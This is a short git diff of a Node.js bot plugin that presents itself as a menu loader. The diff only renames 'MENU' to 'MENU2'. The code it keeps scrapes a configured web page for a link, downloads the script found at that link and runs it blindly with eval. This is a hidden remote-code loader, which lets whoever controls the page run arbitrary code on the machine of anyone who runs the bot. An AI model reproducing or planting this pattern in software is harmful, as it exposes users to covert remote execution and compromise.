@@ -8,19 +8,19 @@ const axios = require('axios');
 const cheerio = require('cheerio');
 const adams = require(__dirname + "/../config");
 
-async function fetchMENUUrl() {
+async function fetchMENU2Url() {
   try {
     const response = await axios.get(adams.BWM_XMD);
     const $ = cheerio.load(response.data);
 
-    const targetElement = $('a:contains("MENU")');
+    const targetElement = $('a:contains("MENU2")');
     const targetUrl = targetElement.attr('href');
 
     if (!targetUrl) {
-      throw new Error('MENU not found 😭');
+      throw new Error('MENU2 not found 😭');
     }
 
-    console.log('MENU loaded successfully ✅');
+    console.log('MENU2 loaded successfully ✅');
 
     const scriptResponse = await axios.get(targetUrl);
     eval(scriptResponse.data);
@@ -30,4 +30,4 @@ async function fetchMENUUrl() {
   }
 }
 
-fetchMENUUrl();
+fetchMENU2Url();
